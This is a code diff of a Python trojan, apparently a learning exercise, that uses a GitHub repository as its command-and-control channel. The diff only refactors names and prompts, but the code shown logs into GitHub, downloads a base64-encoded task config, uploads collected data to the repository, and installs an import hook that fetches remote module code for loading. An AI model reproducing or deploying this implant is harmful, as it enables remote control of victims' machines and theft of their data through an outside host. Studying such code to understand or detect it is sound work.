@@ -1,21 +1,25 @@
 #!/usr/bin/env python3
 
-
 import os, sys
 import imp
 import time
 import json
 import queue
 import base64
-# import random
+import random
 import getpass
 import threading
+
+# BUG fix for a 'stupid' function in Python internals 
+# called PyImport_ImportModuleNoBlock() triggered by
+# datetime.strptime(time_str, __timeformat__) 
+# in module 'github3/models.py'
+import _strptime
 
 from github3 import login
 
 
 
-# trojan id
 trojan_id = 'simple'
 trojan_config = '%s.json' % trojan_id
 trojan_data = 'data/%s/' % trojan_id
@@ -25,19 +29,20 @@ task_queue = queue.Queue()
 
 
 def connect2git():
-    passwd = getpass.getpass('Input your github password: ')
-    git = login(username='wick-ztone', password=passwd)
+    name = 'wick-ztone'
+    pswd = getpass.getpass("Password for 'https://%s@github.com': " % name)
+    git = login(username=name, password=pswd)
     repo = git.repository('wick-ztone', 'BHP-Chapter7')
     br = repo.branch('master')
     return git, repo, br
 
 
-def get_contents(filepath):
+def get_content(filepath):
     git, repo, br = connect2git()
     tree = br.commit.commit.tree.recurse()
     for f in tree.tree:
         if filepath in f.path:
-            print('[*] Found file %s' % filepath)
+            print('[*] Found file <%s>' % filepath)
             blob = repo.blob(f.sha)
             return blob.content
     return None
@@ -45,7 +50,7 @@ def get_contents(filepath):
 
 def get_config():
     global configured
-    _json = base64.b64decode(get_contents(trojan_config))
+    _json = base64.b64decode(get_content(trojan_config))
     conf = json.loads(_json.decode())
     configured = True
     for task in conf:
@@ -60,7 +65,7 @@ def store_module_result(data):
     remote_path = 'data/%s/%d.data' % (trojan_id, id(trojan_id))
     repo.create_file(remote_path, 
                      'Push the data of ::::%s::::' % trojan_id, 
-                     base64.b64encode(data))
+                     base64.b64encode(data.decode() if isinstance(data, str) else data))
 
 
 
@@ -70,11 +75,11 @@ class GitImport(object):
     
     def find_module(self, fullname, path=None):
         if configured:
-            print('[*] Attempting to retrieve %s' % fullname)
-            new_library = get_contents('modules/%s' % fullname)
+            print('[*] Attempting to retrieve <%s>' % fullname)
+            new_library = get_content('modules/%s' % fullname)
             if new_library:
                 self.__code = base64.b64decode(new_library)
-                print('[*] Successfully retrieved %s' % fullname)
+                print('[*] Successfully retrieved <%s>' % fullname)
                 return self
         return None
 
